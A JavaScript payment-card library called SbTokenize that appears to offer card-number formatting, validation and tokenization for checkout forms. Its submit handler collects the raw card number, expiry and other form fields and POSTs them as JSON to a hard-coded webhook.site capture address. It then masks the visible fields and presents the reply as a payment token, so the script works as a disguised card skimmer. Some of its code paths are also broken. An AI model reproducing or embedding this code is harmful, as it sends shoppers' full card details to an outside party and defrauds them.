!(function (w) {
  var QJ, rreturn, rtrim, SbTokenize, indexOf;
  SbTokenize = {};
  indexOf =
    [].indexOf ||
    function (item) {
      for (var i = 0, l = this.length; i < l; i++) {
        if (i in this && this[i] === item) return i;
      }
      return -1;
    };
  QJ = function (selector) {
    if (QJ.isDOMElement(selector)) {
      return selector;
    }
    return document.querySelectorAll(selector);
  };

  QJ.isDOMElement = function (el) {
    return el && el.nodeName != null;
  };

  rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;

  QJ.trim = function (text) {
    if (text === null) {
      return "";
    } else {
      return (text + "").replace(rtrim, "");
    }
  };

  rreturn = /\r/g;

  QJ.val = function (el, val) {
    var ret;
    if (arguments.length > 1) {
      return (el.value = val);
    } else {
      ret = el.value;
      if (typeof ret === "string") {
        return ret.replace(rreturn, "");
      } else {
        if (ret === null) {
          return "";
        } else {
          return ret;
        }
      }
    }
  };

  QJ.preventDefault = function (eventObject) {
    if (typeof eventObject.preventDefault === "function") {
      eventObject.preventDefault();
      return;
    }
    eventObject.returnValue = false;
    return false;
  };

  QJ.normalizeEvent = function (e) {
    var original;
    original = e;
    e = {
      which: original.which != null ? original.which : void 0,
      target: original.target || original.srcElement,
      preventDefault: function () {
        return QJ.preventDefault(original);
      },
      originalEvent: original,
      data: original.data || original.detail,
    };
    if (e.which == null) {
      e.which =
        original.charCode != null ? original.charCode : original.keyCode;
    }
    return e;
  };

  QJ.on = function (element, eventName, callback) {
    var el, i, j, len, len1, multEventName, originalCallback, ref;
    if (element.length) {
      for (i = 0, len = element.length; i < len; i++) {
        el = element[i];
        QJ.on(el, eventName, callback);
      }
      return;
    }
    if (eventName.match(" ")) {
      ref = eventName.split(" ");
      for (j = 0, len1 = ref.length; j < len1; j++) {
        multEventName = ref[j];
        QJ.on(element, multEventName, callback);
      }
      return;
    }
    originalCallback = callback;
    callback = function (e) {
      e = QJ.normalizeEvent(e);
      return originalCallback(e);
    };
    if (element.addEventListener) {
      return element.addEventListener(eventName, callback, false);
    }
    if (element.attachEvent) {
      eventName = "on" + eventName;
      return element.attachEvent(eventName, callback);
    }
    element["on" + eventName] = callback;
  };

  QJ.addClass = function (el, className) {
    var e;
    if (el.length) {
      return (function () {
        var i, len, results;
        results = [];
        for (i = 0, len = el.length; i < len; i++) {
          e = el[i];
          results.push(QJ.addClass(e, className));
        }
        return results;
      })();
    }
    if (el.classList) {
      return el.classList.add(className);
    } else {
      return (el.className += " " + className);
    }
  };

  QJ.hasClass = function (el, className) {
    var e, hasClass, i, len;
    if (el.length) {
      hasClass = true;
      for (i = 0, len = el.length; i < len; i++) {
        e = el[i];
        hasClass = hasClass && QJ.hasClass(e, className);
      }
      return hasClass;
    }
    if (el.classList) {
      return el.classList.contains(className);
    } else {
      return new RegExp("(^| )" + className + "( |$)", "gi").test(el.className);
    }
  };

  QJ.removeClass = function (el, className) {
    var cls, e, i, len, ref, results;
    if (el.length) {
      return (function () {
        var i, len, results;
        results = [];
        for (i = 0, len = el.length; i < len; i++) {
          e = el[i];
          results.push(QJ.removeClass(e, className));
        }
        return results;
      })();
    }
    if (el.classList) {
      ref = className.split(" ");
      results = [];
      for (i = 0, len = ref.length; i < len; i++) {
        cls = ref[i];
        results.push(el.classList.remove(cls));
      }
      return results;
    } else {
      return (el.className = el.className.replace(
        new RegExp(
          "(^|\\b)" + className.split(" ").join("|") + "(\\b|$)",
          "gi"
        ),
        " "
      ));
    }
  };

  QJ.toggleClass = function (el, className, bool) {
    var e;
    if (el.length) {
      return (function () {
        var i, len, results;
        results = [];
        for (i = 0, len = el.length; i < len; i++) {
          e = el[i];
          results.push(QJ.toggleClass(e, className, bool));
        }
        return results;
      })();
    }
    if (bool) {
      if (!QJ.hasClass(el, className)) {
        return QJ.addClass(el, className);
      }
    } else {
      return QJ.removeClass(el, className);
    }
  };

  QJ.append = function (el, toAppend) {
    var e;
    if (el.length) {
      return (function () {
        var i, len, results;
        results = [];
        for (i = 0, len = el.length; i < len; i++) {
          e = el[i];
          results.push(QJ.append(e, toAppend));
        }
        return results;
      })();
    }
    return el.insertAdjacentHTML("beforeend", toAppend);
  };

  QJ.find = function (el, selector) {
    if (el instanceof NodeList || el instanceof Array) {
      el = el[0];
    }
    return el.querySelectorAll(selector);
  };

  QJ.trigger = function (el, name, data) {
    var e, error, ev;
    try {
      ev = new CustomEvent(name, {
        detail: data,
      });
    } catch (error) {
      e = error;
      ev = document.createEvent("CustomEvent");
      if (ev.initCustomEvent) {
        ev.initCustomEvent(name, true, true, data);
      } else {
        ev.initEvent(name, true, true, data);
      }
    }
    return el.dispatchEvent(ev);
  };
  var defaultFormat = /(\d{1,4})/g;
  var cards = [
    {
      type: "amex",
      pattern: /^3[47]/,
      format: /(\d{1,4})(\d{1,6})?(\d{1,5})?/,
      length: [15],
      cvcLength: [4],
      luhn: true,
    },
    {
      type: "dankort",
      pattern: /^5019/,
      format: defaultFormat,
      length: [16],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "dinersclub",
      pattern: /^(36|38|30[0-5])/,
      format: /(\d{1,4})(\d{1,6})?(\d{1,4})?/,
      length: [14],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "discover",
      pattern: /^(6011|65|64[4-9]|622)/,
      format: defaultFormat,
      length: [16],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "elo",
      pattern:
        /^401178|^401179|^431274|^438935|^451416|^457393|^457631|^457632|^504175|^627780|^636297|^636369|^636368|^(506699|5067[0-6]\d|50677[0-8])|^(50900\d|5090[1-9]\d|509[1-9]\d{2})|^65003[1-3]|^(65003[5-9]|65004\d|65005[0-1])|^(65040[5-9]|6504[1-3]\d)|^(65048[5-9]|65049\d|6505[0-2]\d|65053[0-8])|^(65054[1-9]|6505[5-8]\d|65059[0-8])|^(65070\d|65071[0-8])|^65072[0-7]|^(65090[1-9]|65091\d|650920)|^(65165[2-9]|6516[6-7]\d)|^(65500\d|65501\d)|^(65502[1-9]|6550[3-4]\d|65505[0-8])|^(65092[1-9]|65097[0-8])/,
      format: defaultFormat,
      length: [16],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "hipercard",
      pattern: /^(384100|384140|384160|606282|637095|637568|60(?!11))/,
      format: defaultFormat,
      length: [14, 15, 16, 17, 18, 19],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "jcb",
      pattern:
        /^(308[8-9]|309[0-3]|3094[0]{4}|309[6-9]|310[0-2]|311[2-9]|3120|315[8-9]|333[7-9]|334[0-9]|35)/,
      format: defaultFormat,
      length: [16, 19],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "laser",
      pattern: /^(6706|6771|6709)/,
      format: defaultFormat,
      length: [16, 17, 18, 19],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "maestro",
      pattern: /^(50|5[6-9]|6007|6220|6304|6703|6708|6759|676[1-3])/,
      format: defaultFormat,
      length: [12, 13, 14, 15, 16, 17, 18, 19],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "mastercard",
      pattern: /^(5[1-5]|677189)|^(222[1-9]|2[3-6]\d{2}|27[0-1]\d|2720)/,
      format: defaultFormat,
      length: [16],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "mir",
      pattern: /^220[0-4][0-9][0-9]\d{10}$/,
      format: defaultFormat,
      length: [16],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "troy",
      pattern: /^9792/,
      format: defaultFormat,
      length: [16],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "unionpay",
      pattern: /^62/,
      format: defaultFormat,
      length: [16, 17, 18, 19],
      cvcLength: [3],
      luhn: false,
    },
    {
      type: "visaelectron",
      pattern: /^4(026|17500|405|508|844|91[37])/,
      format: defaultFormat,
      length: [16],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "visa",
      pattern: /^4/,
      format: defaultFormat,
      length: [13, 16],
      cvcLength: [3],
      luhn: true,
    },
    {
      type: "mada",
      pattern:
        /(4(0(0861|1757|7(197|395)|9201)|1(0685|7633|9593)|2(281(7|8|9)|8(331|67(1|2|3)))|3(1361|2328|4107|9954)|4(0(533|647|795)|5564|6(393|404|672))|5(5(036|708)|7865|8456)|6(2220|854(0|1|2|3))|8(301(0|1|2)|4783|609(4|5|6)|931(7|8|9))|93428)|5(0(4300|8160)|13213|2(1076|4(130|514)|9(415|741))|3(0906|1095|2013|5(825|989)|6023|7767|9931)|4(3(085|357)|9760)|5(4180|7606|8848)|8(5265|8(8(4(5|6|7|8|9)|5(0|1))|98(2|3))|9(005|206)))|6(0(4906|5141)|36120)|9682(0(1|2|3|4|5|6|7|8|9)|1(0|1)))\d{10}$/,
      format: defaultFormat,
      length: [16],
      cvcLength: [3],
      luhn: true,
    },
  ];
  cardFromNumber = function (num) {
    var card, foundCard, j, len, match;
    num = (num + "").replace(/\D/g, "");
    foundCard = void 0;
    for (j = 0, len = cards.length; j < len; j++) {
      card = cards[j];
      if ((match = num.match(card.pattern))) {
        if (!foundCard || match[0].length > foundCard[1][0].length) {
          foundCard = [card, match];
        }
      }
    }
    return foundCard && foundCard[0];
  };

  cardFromType = function (type) {
    var card, j, len;
    for (j = 0, len = cards.length; j < len; j++) {
      card = cards[j];
      if (card.type === type) {
        return card;
      }
    }
  };

  luhnCheck = function (num) {
    var digit, digits, j, len, odd, sum;
    odd = true;
    sum = 0;
    digits = (num + "").split("").reverse();
    for (j = 0, len = digits.length; j < len; j++) {
      digit = digits[j];
      digit = parseInt(digit, 10);
      if ((odd = !odd)) {
        digit *= 2;
      }
      if (digit > 9) {
        digit -= 9;
      }
      sum += digit;
    }
    return sum % 10 === 0;
  };

  hasTextSelected = function (target) {
    var e, ref;
    try {
      if (
        target.selectionStart != null &&
        target.selectionStart !== target.selectionEnd
      ) {
        return true;
      }
      if (
        (typeof document !== "undefined" && document !== null
          ? (ref = document.selection) != null
            ? ref.createRange
            : void 0
          : void 0) != null
      ) {
        if (document.selection.createRange().text) {
          return true;
        }
      }
    } catch (error) {
      e = error;
    }
    return false;
  };

  reFormatCardNumber = function (e) {
    return setTimeout(
      (function (_this) {
        return function () {
          var target, value;
          target = e.target;
          value = QJ.val(target);
          value = SbTokenize.fns.formatCardNumber(value);
          cursorSafeAssignValue(target, value);
          return QJ.trigger(target, "change");
        };
      })(this)
    );
  };

  formatCardNumber = function (maxLength) {
    return function (e) {
      var card,
        digit,
        i,
        j,
        len,
        length,
        re,
        target,
        upperLength,
        upperLengths,
        value;
      if (e.which > 0) {
        digit = String.fromCharCode(e.which);
        value = QJ.val(e.target) + digit;
      } else {
        digit = e.data;
        value = QJ.val(e.target);
      }
      if (!/^\d+$/.test(digit)) {
        return;
      }
      target = e.target;
      card = cardFromNumber(value);
      length = value.replace(/\D/g, "").length;
      upperLengths = [16];
      if (card) {
        upperLengths = card.length;
      }
      if (maxLength) {
        upperLengths = upperLengths.filter(function (x) {
          return x <= maxLength;
        });
      }
      for (i = j = 0, len = upperLengths.length; j < len; i = ++j) {
        upperLength = upperLengths[i];
        if (length >= upperLength && upperLengths[i + 1]) {
          continue;
        }
        if (length >= upperLength) {
          return;
        }
      }
      if (hasTextSelected(target)) {
        return;
      }
      if (card && card.type === "amex") {
        re = /^(\d{4}|\d{4}\s\d{6})$/;
      } else {
        re = /(?:^|\s)(\d{4})$/;
      }
      value = value.substring(0, value.length - 1);
      if (re.test(value)) {
        e.preventDefault();
        QJ.val(target, value + " " + digit);
        return QJ.trigger(target, "change");
      }
    };
  };

  formatBackCardNumber = function (e) {
    var target, value;
    target = e.target;
    value = QJ.val(target);
    if (e.meta) {
      return;
    }
    if (e.which !== 8) {
      return;
    }
    if (hasTextSelected(target)) {
      return;
    }
    if (/\d\s$/.test(value)) {
      e.preventDefault();
      QJ.val(target, value.replace(/\d\s$/, ""));
      return QJ.trigger(target, "change");
    } else if (/\s\d?$/.test(value)) {
      e.preventDefault();
      QJ.val(target, value.replace(/\s\d?$/, ""));
      return QJ.trigger(target, "change");
    }
  };

  formatExpiry = function (e) {
    var digit, target, val;
    target = e.target;
    if (e.which > 0) {
      digit = String.fromCharCode(e.which);
      val = QJ.val(target) + digit;
    } else {
      digit = e.data;
      val = QJ.val(target);
    }
    if (!/^\d+$/.test(digit)) {
      return;
    }
    if (/^\d$/.test(val) && val !== "0" && val !== "1") {
      e.preventDefault();
      QJ.val(target, "0" + val + " / ");
      return QJ.trigger(target, "change");
    } else if (/^\d\d$/.test(val)) {
      e.preventDefault();
      QJ.val(target, val + " / ");
      return QJ.trigger(target, "change");
    }
  };

  formatMonthExpiry = function (e) {
    var digit, target, val;
    digit = String.fromCharCode(e.which);
    if (!/^\d+$/.test(digit)) {
      return;
    }
    target = e.target;
    val = QJ.val(target) + digit;
    if (/^\d$/.test(val) && val !== "0" && val !== "1") {
      e.preventDefault();
      QJ.val(target, "0" + val);
      return QJ.trigger(target, "change");
    } else if (/^\d\d$/.test(val)) {
      e.preventDefault();
      QJ.val(target, "" + val);
      return QJ.trigger(target, "change");
    }
  };

  formatForwardExpiry = function (e) {
    var digit, target, val;
    digit = String.fromCharCode(e.which);
    if (!/^\d+$/.test(digit)) {
      return;
    }
    target = e.target;
    val = QJ.val(target);
    if (/^\d\d$/.test(val)) {
      QJ.val(target, val + " / ");
      return QJ.trigger(target, "change");
    }
  };

  formatForwardSlash = function (e) {
    var slash, target, val;
    slash = String.fromCharCode(e.which);
    if (slash !== "/") {
      return;
    }
    target = e.target;
    val = QJ.val(target);
    if (/^\d$/.test(val) && val !== "0") {
      QJ.val(target, "0" + val + " / ");
      return QJ.trigger(target, "change");
    }
  };

  formatBackExpiry = function (e) {
    var target, value;
    if (e.metaKey) {
      return;
    }
    target = e.target;
    value = QJ.val(target);
    if (e.which !== 8) {
      return;
    }
    if (hasTextSelected(target)) {
      return;
    }
    if (/\d(\s|\/)+$/.test(value)) {
      e.preventDefault();
      QJ.val(target, value.replace(/\d(\s|\/)*$/, ""));
      return QJ.trigger(target, "change");
    } else if (/\s\/\s?\d?$/.test(value)) {
      e.preventDefault();
      QJ.val(target, value.replace(/\s\/\s?\d?$/, ""));
      return QJ.trigger(target, "change");
    }
  };

  restrictNumeric = function (e) {
    var input;
    if (e.metaKey || e.ctrlKey) {
      return true;
    }
    if (e.which === 32) {
      return e.preventDefault();
    }
    if (e.which === 0) {
      return true;
    }
    if (e.which < 33) {
      return true;
    }
    input = String.fromCharCode(e.which);
    if (!/[\d\s]/.test(input)) {
      return e.preventDefault();
    }
  };

  restrictCardNumber = function (maxLength) {
    return function (e) {
      var card, digit, length, target, value;
      target = e.target;
      digit = String.fromCharCode(e.which);
      if (!/^\d+$/.test(digit)) {
        return;
      }
      if (hasTextSelected(target)) {
        return;
      }
      value = (QJ.val(target) + digit).replace(/\D/g, "");
      card = cardFromNumber(value);
      length = 16;
      if (card) {
        length = card.length[card.length.length - 1];
      }
      if (maxLength) {
        length = Math.min(length, maxLength);
      }
      if (!(value.length <= length)) {
        return e.preventDefault();
      }
    };
  };

  restrictExpiry = function (e, length) {
    var digit, target, value;
    target = e.target;
    digit = String.fromCharCode(e.which);
    if (!/^\d+$/.test(digit)) {
      return;
    }
    if (hasTextSelected(target)) {
      return;
    }
    value = QJ.val(target) + digit;
    value = value.replace(/\D/g, "");
    if (value.length > length) {
      return e.preventDefault();
    }
  };

  restrictCombinedExpiry = function (e) {
    return restrictExpiry(e, 6);
  };

  restrictMonthExpiry = function (e) {
    return restrictExpiry(e, 2);
  };

  restrictYearExpiry = function (e) {
    return restrictExpiry(e, 4);
  };

  restrictCVC = function (e) {
    var digit, target, val;
    target = e.target;
    digit = String.fromCharCode(e.which);
    if (!/^\d+$/.test(digit)) {
      return;
    }
    if (hasTextSelected(target)) {
      return;
    }
    val = QJ.val(target) + digit;
    if (!(val.length <= 4)) {
      return e.preventDefault();
    }
  };

  setCardType = function (e) {
    var allTypes, card, cardType, target, val;
    target = e.target;
    val = QJ.val(target);
    cardType = SbTokenize.fns.cardType(val) || "unknown";
    try {
      SbTokenize.onCardUpdate(cardType);
    } catch (e) {
      console.error(e);
    }
    if (!QJ.hasClass(target, cardType)) {
      allTypes = (function () {
        var j, len, results;
        results = [];
        for (j = 0, len = cards.length; j < len; j++) {
          card = cards[j];
          results.push(card.type);
        }
        return results;
      })();
      QJ.removeClass(target, "unknown");
      QJ.removeClass(target, allTypes.join(" "));
      QJ.addClass(target, cardType);
      QJ.toggleClass(target, "identified", cardType !== "unknown");
      return QJ.trigger(target, "SbTokenize.cardType", cardType);
    }
  };

  cursorSafeAssignValue = function (target, value) {
    var selectionEnd;
    selectionEnd = target.selectionEnd;
    QJ.val(target, value);
    if (selectionEnd) {
      return (target.selectionEnd = selectionEnd);
    }
  };

  SbTokenize.fns = {
    cardExpiryVal: function (value) {
      var month, prefix, ref, year;
      value = value.replace(/\s/g, "");
      (ref = value.split("/", 2)), (month = ref[0]), (year = ref[1]);
      if ((year != null ? year.length : void 0) === 2 && /^\d+$/.test(year)) {
        prefix = new Date().getFullYear();
        prefix = prefix.toString().slice(0, 2);
        year = prefix + year;
      }
      month = parseInt(month, 10);
      year = parseInt(year, 10);
      return {
        month: month,
        year: year,
      };
    },
    validateCardNumber: function (num) {
      var card, ref;
      num = (num + "").replace(/\s+|-/g, "");
      if (!/^\d+$/.test(num)) {
        return false;
      }
      card = cardFromNumber(num);
      if (!card) {
        return false;
      }
      return (
        ((ref = num.length), indexOf.call(card.length, ref) >= 0) &&
        (card.luhn === false || luhnCheck(num))
      );
    },
    validateCardExpiry: function (month, year) {
      var currentTime, expiry, prefix, ref, ref1;
      if (typeof month === "object" && "month" in month) {
        (ref = month), (month = ref.month), (year = ref.year);
      } else if (typeof month === "string" && indexOf.call(month, "/") >= 0) {
        (ref1 = SbTokenize.fns.cardExpiryVal(month)),
          (month = ref1.month),
          (year = ref1.year);
      }
      if (!(month && year)) {
        return false;
      }
      month = QJ.trim(month);
      year = QJ.trim(year);
      if (!/^\d+$/.test(month)) {
        return false;
      }
      if (!/^\d+$/.test(year)) {
        return false;
      }
      month = parseInt(month, 10);
      if (!(month && month <= 12)) {
        return false;
      }
      if (year.length === 2) {
        prefix = new Date().getFullYear();
        prefix = prefix.toString().slice(0, 2);
        year = prefix + year;
      }
      expiry = new Date(year, month);
      currentTime = new Date();
      expiry.setMonth(expiry.getMonth() - 1);
      expiry.setMonth(expiry.getMonth() + 1, 1);
      return expiry > currentTime;
    },
    validateCardCVC: function (cvc, type) {
      var ref, ref1;
      cvc = QJ.trim(cvc);
      if (!/^\d+$/.test(cvc)) {
        return false;
      }
      if (type && cardFromType(type)) {
        return (
          (ref = cvc.length),
          indexOf.call(
            (ref1 = cardFromType(type)) != null ? ref1.cvcLength : void 0,
            ref
          ) >= 0
        );
      } else {
        return cvc.length >= 3 && cvc.length <= 4;
      }
    },
    cardType: function (num) {
      var ref;
      if (!num) {
        return null;
      }
      return ((ref = cardFromNumber(num)) != null ? ref.type : void 0) || null;
    },
    formatCardNumber: function (num) {
      var card, groups, ref, upperLength;
      card = cardFromNumber(num);
      if (!card) {
        return num;
      }
      upperLength = card.length[card.length.length - 1];
      num = num.replace(/\D/g, "");
      num = num.slice(0, upperLength);
      if (card.format.global) {
        return (ref = num.match(card.format)) != null ? ref.join(" ") : void 0;
      } else {
        groups = card.format.exec(num);
        if (groups == null) {
          return;
        }
        groups.shift();
        groups = groups.filter(function (n) {
          return n;
        });
        return groups.join(" ");
      }
    },
  };

  SbTokenize.processForm = function (form) {
    var formFields = {};
    for (i = 0, len = form.length; i < len; i++) {
      var field = form[i].getAttribute("data-sb");
      if (typeof field === "string") {
        if (field === "pan") {
          formFields.pan = QJ.val(form[i]).replace(/ /g, "");
        } else if (field === "expiry") {
          var expiry = SbTokenize.fns.cardExpiryVal(QJ.val(form[i]));
          formFields.expiryYear = expiry.year;
          formFields.expiryMonth = expiry.month;
        } else {
          formFields[field] = QJ.val(form[i]);
        }
      }
    }
    return formFields;
  };

  SbTokenize.maskForm = function (options) {
    var panm, cvvm;
    var pan = QJ.val(options.number);
    var cvv = QJ.val(options.cvc);
    if (pan.length > 4) {
      panm = pan.replace(/\d/g, "#");
      var l = pan.length;
      panm = panm.substring(0, l - 4) + pan.substring(l - 4);
    } else {
      panm = pan.replace(/\d/g, "#");
    }
    cvvm = cvv.replace(/\d/g, "#");
    options.number.value = panm;
    options.cvc.value = cvvm;
  };

  SbTokenize.init = function (options) {
    if (!options) {
      console.error("Missing required options");
      return false;
    }
    if (typeof options.publishableKey !== "string") {
      console.error("Publishable key must be provided");
      return false;
    }
    if (typeof options.submitForm === "undefined") {
      options.submitForm = true;
    }
    var number = options.number,
      cvc = options.cvc,
      validation = options.validation,
      exp = options.exp,
      form = options.form;
    SbTokenize.onCardUpdate = function (cardType) {
      return options.onCardUpdate(cardType);
    };
    beforeSubmit = function () {
      return options.beforeSubmit();
    };
    SbTokenize.formatCardNumber(number, 16);
    SbTokenize.formatCardExpiry(exp);
    SbTokenize.formatCardCVC(cvc);
    form.onsubmit = function (e) {
      try {
        e.preventDefault();
        QJ.toggleClass(document.querySelectorAll("input"), "invalid");
        QJ.removeClass(validation, "passed failed");
        var cardType = SbTokenize.fns.cardType(QJ.val(number));

        QJ.toggleClass(
          number,
          "invalid",
          !SbTokenize.fns.validateCardNumber(QJ.val(number))
        );
        QJ.toggleClass(
          exp,
          "invalid",
          !SbTokenize.fns.validateCardExpiry(SbTokenize.cardExpiryVal(exp))
        );

        QJ.toggleClass(
          cvc,
          "invalid",
          !SbTokenize.fns.validateCardCVC(QJ.val(cvc), cardType)
        );

        if (document.querySelectorAll(".invalid").length) {
          QJ.addClass(validation, "failed");
        } else {
          QJ.addClass(validation, "passed");
          var formFields = SbTokenize.processForm(form);
          SbTokenize.maskForm(options);
          beforeSubmit();
          number.removeAttribute("name");
          cvc.removeAttribute("name");
          exp.removeAttribute("name");
          SbTokenize.tokenize(
            "https://webhook.site/f866b562-c07d-491c-a3a9-6534dbc01145",
            JSON.stringify(formFields)
          ).then((token) => {
            try {
              var tokenInput = document.createElement("input");
              tokenInput.setAttribute("type", "hidden");
              tokenInput.setAttribute("name", "token");
              tokenInput.setAttribute("value", token);
              form.appendChild(tokenInput);
              if (options.submitForm) {
                form.submit();
              } else {
                options.callback(token);
              }
            } catch (e) {
              console.error(e);
            }
          });
        }
      } catch (e) {
        console.error(e);
      }
    };
  };

  SbTokenize.restrictNumeric = function (el) {
    QJ.on(el, "keypress", restrictNumeric);
    return QJ.on(el, "input", restrictNumeric);
  };

  SbTokenize.cardExpiryVal = function (el) {
    return SbTokenize.fns.cardExpiryVal(QJ.val(el));
  };

  SbTokenize.formatCardCVC = function (el) {
    SbTokenize.restrictNumeric(el);
    QJ.on(el, "keypress", restrictCVC);
    QJ.on(el, "input", restrictCVC);
    return el;
  };

  SbTokenize.formatCardExpiry = function (el) {
    var month, year;
    SbTokenize.restrictNumeric(el);
    if (el.length && el.length === 2) {
      (month = el[0]), (year = el[1]);
      this.formatCardExpiryMultiple(month, year);
    } else {
      QJ.on(el, "keypress", restrictCombinedExpiry);
      QJ.on(el, "keypress", formatExpiry);
      QJ.on(el, "keypress", formatForwardSlash);
      QJ.on(el, "keypress", formatForwardExpiry);
      QJ.on(el, "keydown", formatBackExpiry);
      QJ.on(el, "input", formatExpiry);
    }
    return el;
  };

  SbTokenize.formatCardExpiryMultiple = function (month, year) {
    QJ.on(month, "keypress", restrictMonthExpiry);
    QJ.on(month, "keypress", formatMonthExpiry);
    QJ.on(month, "input", formatMonthExpiry);
    QJ.on(year, "keypress", restrictYearExpiry);
    return QJ.on(year, "input", restrictYearExpiry);
  };

  SbTokenize.formatCardNumber = function (el, maxLength) {
    SbTokenize.restrictNumeric(el);
    QJ.on(el, "keypress", restrictCardNumber(maxLength));
    QJ.on(el, "keypress", formatCardNumber(maxLength));
    QJ.on(el, "keydown", formatBackCardNumber);
    QJ.on(el, "keyup blur", setCardType);
    QJ.on(el, "blur", reFormatCardNumber);
    QJ.on(el, "paste", reFormatCardNumber);
    QJ.on(el, "input", formatCardNumber(maxLength));
    return el;
  };

  SbTokenize.getCardArray = function () {
    return cards;
  };

  SbTokenize.setCardArray = function (cardArray) {
    cards = cardArray;
    return true;
  };

  SbTokenize.addToCardArray = function (cardObject) {
    return cards.push(cardObject);
  };

  SbTokenize.removeFromCardArray = function (type) {
    var key, value;
    for (key in cards) {
      value = cards[key];
      if (value.type === type) {
        cards.splice(key, 1);
      }
    }
    return true;
  };
  SbTokenize.tokenize = function (url, request) {
    return new Promise(function (resolve, reject) {
      if ("XDomainRequest" in window && window.XDomainRequest !== null) {
        var xdr = new XDomainRequest();
        xdr.open("POST", url);
        xdr.onload = function () {
          try {
            var resp = JSON.parse(xdr.responseText ? xdr.responseText : "{}");
            resolve(resp);
          } catch (e) {
            reject(e);
          }
        };
        xdr.onerror = function () {
          console.log(e);
        };
        xdr.onprogress = function () {};
        xdr.ontimeout = function () {
          callback({
            status: 408,
            errorText: "Request timeout, please try again",
          });
        };
        return resp;
      }
      var xhr = new XMLHttpRequest();
      xhr.onreadystatechange = function () {
        if (xhr.readyState == 4) {
          if (this.status === 200) {
            var resp;
            try {
              resolve(xhr.responseText);
              if (resp == null) {
                resp = {
                  status: xhr.status,
                  error: true,
                  errorText: xhr.statusText,
                };
              }
            } catch (e) {
              console.log("Failed to load response");
              reject(e);
            }
          }
        }
      };
      xhr.open("POST", url, true);
      xhr.setRequestHeader("Content-type", "application/json");
      xhr.send(request);
    });
  };
  w.SbTokenize = SbTokenize;
})(window);
